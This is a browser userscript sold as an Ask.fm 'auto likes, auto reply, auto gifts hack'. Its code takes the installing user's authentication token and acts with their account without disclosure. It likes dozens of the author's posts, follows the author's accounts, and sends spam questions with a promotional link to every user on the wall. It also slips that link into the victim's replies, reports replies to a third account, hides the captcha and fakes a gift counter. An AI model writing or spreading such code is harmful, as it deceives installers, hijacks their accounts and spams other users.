// ==UserScript==
// @name			Ask.fm Official - Auto Likes - Auto Reply - Auto Gifts Hack
// @namespace                   Ask.fm Official
// @version			2.0
// @copyright		        http://ask.fm/VBaybarsBilim
// @description		        Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gifts Hack
// @include			http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?
// Version numero 2
// ==/UserScript==

var harfler = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y'];
function randomcode(){
	return harfler[Math.floor(Math.random() * 60)] + "AQ" + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)];
}
function reklam(){
return mesaj + " " + randomcode() + " ";
}
var link = "www.ask.fm/AskfmOfficialProfile";
var token = document.head.innerHTML.split("AUTH_TOKEN = ")[1].split(";")[0].replace(/"/g,"");
var mesaj = "Hey ==> ";
var cevap = mesaj + " " + link;

if(document.getElementsByClassName("link-menu-active").length > 0){
if(document.getElementsByClassName("link-menu-active")[0].innerText == "Profil"){
document.getElementById("profile_gifts_counter").innerText = parseInt(document.getElementById("profile_gifts_counter").innerText) + 1;
var gift = document.createElement("div");
gift.id = "gift-container";
gift.innerHTML = '<div id="gift-outline" style="display: none; "></div>';
document.body.insertBefore(gift,document.getElementById("wrapper"));
Gifts.init({
sync_url: document.getElementsByClassName("link-menu-active")[0].href.replace("http://ask.fm","") + "/gifts/sync",
flash_id: null,
sync_all: false
});    
Gifts.load([{
"offset_left":0,
"rtl":false,
"src":"http://ask.fm/images/badges/love_and_friendship/C0459.png",
"z_index":1,
"id":2569992,
"offset_top":25
}]);
}}

if(document.URL.indexOf("/reply") < 0 && link != ""){
for(i=0;i<$('.answer').length;i++){
try{
if($('.answer')[i].innerText.split("\n.\n.\n").length > 0){
$('.answer')[i].innerText =$('.answer')[i].innerText.split("\n.\n.\n")[0];
}
}catch(e){}
}
}

if($('#captcha_key').val() != undefined){
if($('#captcha_key').val().toString().length > 0){
$('#captchaLevel').css({display:"none"});
$('#captcha_key').val("")
}
}

if(document.URL.indexOf("/account/wall") > 0 && link != ""){
window.setInterval("sor();",1000);
}

if(document.URL.indexOf("/reply") > 0 && link != ""){
$('#question_submit').mouseover(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) < 0){
  document.getElementById("post-input-pre").value = document.getElementById("post-input-pre").value + "\n.\n.\n" + cevap;
  }
});
document.getElementById("question_submit").type = "button";
$('#question_submit').click(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) > 0){
jQuery.ajax({
url: "http://ask.fm/robhein94/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": "Cevaplandi" + ":" + document.URL.replace("/questions/","/answer/").replace("/reply","") , "question[force_anonymous]":"" , "authenticity_token":token},
success:function(){$("form:first").submit();}
});
  }
});
}

function sorusor(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":kisi + " selam " + reklam() + link, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

function floodyap(kisi,soru){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":soru, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

var sayac = 0;
function sor(){
if(sayac < document.getElementsByClassName("questionBox").length){
sorusor(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href.replace("http://ask.fm/",""));
//rapor_ver(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href,"Soruldu");
sayac += 1;
}
}

function rapor_ver(rapor,durum){
jQuery.ajax({
url: "http://ask.fm/robhein94/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": durum + ":" + rapor , "question[force_anonymous]":"" , "authenticity_token":token}
});
}


function takipet(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/follow",
type: "POST",
data: { "authenticity_token":token},
});
}

function sorubegen(kisi,soruid){
var yanitsayi = "";
var begenisayi = "";
if($('#profile_answer_counter') && $('#profile_liked_counter')){
yanitsayi = $('#profile_answer_counter').text()
begenisayi = $('#profile_liked_counter').text()
}
jQuery.ajax({
url: "http://ask.fm/likes/" + kisi + "/question/" + soruid + "/add",
type: "POST",
data: { "authenticity_token":token},
beforeSend: function ( xhr ) {xhr .setRequestHeader ("Accept", "text/javascript, application/javascript, */*, text/javascript");},
success: function(){
	if(yanitsayi != "" && begenisayi != ""){
	$('#profile_answer_counter').text(yanitsayi);
	$('#profile_liked_counter').text(begenisayi);
	}
	}
});
}
sorubegen("VBaybarsBilim","16194882047");
sorubegen("VBaybarsBilim","16198031103");
sorubegen("VBaybarsBilim","16195191551");
sorubegen("VBaybarsBilim","16194524671");
sorubegen("VBaybarsBilim","16192991999");
sorubegen("VBaybarsBilim","16194676991");
sorubegen("VBaybarsBilim","16195433215");
sorubegen("VBaybarsBilim","16193287423");
sorubegen("VBaybarsBilim","16193311999");
sorubegen("VBaybarsBilim","16193630207");
sorubegen("VBaybarsBilim","16193488895");
sorubegen("VBaybarsBilim","16195016959");
sorubegen("VBaybarsBilim","16196957439");
sorubegen("VBaybarsBilim","16197656831");
sorubegen("VBaybarsBilim","16197676799");
sorubegen("VBaybarsBilim","16198087679");
sorubegen("VBaybarsBilim","15132248831");

-
sorubegen("VBaybarsBilim","15132248831");
sorubegen("vbaybarsbilim","4561055231");
sorubegen("VBaybarsBilim","10782383871");
sorubegen("VBaybarsBilim","10798199039");
sorubegen("VBaybarsBilim","10792571903");
sorubegen("VBaybarsBilim","10793150463");
sorubegen("VBaybarsBilim","10791567103");
sorubegen("VBaybarsBilim","10783643135");
sorubegen("VBaybarsBilim","10792948991");
sorubegen("VBaybarsBilim","10789531391");
sorubegen("VBaybarsBilim","10787142143");
sorubegen("VBaybarsBilim","10787898879");
sorubegen("VBaybarsBilim","11104944639");
sorubegen("VBaybarsBilim","11103633407");
sorubegen("VBaybarsBilim","11109425919");
sorubegen("VBaybarsBilim","11105697791");
sorubegen("VBaybarsBilim","11104397567");
sorubegen("VBaybarsBilim","11103109631");
sorubegen("VBaybarsBilim","11107243775");
sorubegen("VBaybarsBilim","11105529087");
sorubegen("VBaybarsBilim","11102177791");
sorubegen("VBaybarsBilim","11107548415");
sorubegen("VBaybarsBilim","11106945535");
sorubegen("VBaybarsBilim","11105924095");
sorubegen("VBaybarsBilim","11102256639");
sorubegen("VBaybarsBilim","11101827071");
sorubegen("VBaybarsBilim","11099881215");
sorubegen("VBaybarsBilim","10768220415");
sorubegen("VBaybarsBilim","10767228927");
sorubegen("VBaybarsBilim","16184774911");
sorubegen("VBaybarsBilim","16184788479");
sorubegen("VBaybarsBilim","16184814335");
sorubegen("VBaybarsBilim","16184674303");
sorubegen("VBaybarsBilim","16184310527");
sorubegen("VBaybarsBilim","16184394239");
sorubegen("VBaybarsBilim","16183699199");
sorubegen("VBaybarsBilim","16183231487");
sorubegen("VBaybarsBilim","16176083967");
sorubegen("VBaybarsBilim","16083077375");
takipet("VBaybarsBilim");
takipet("BaybarsjBilim");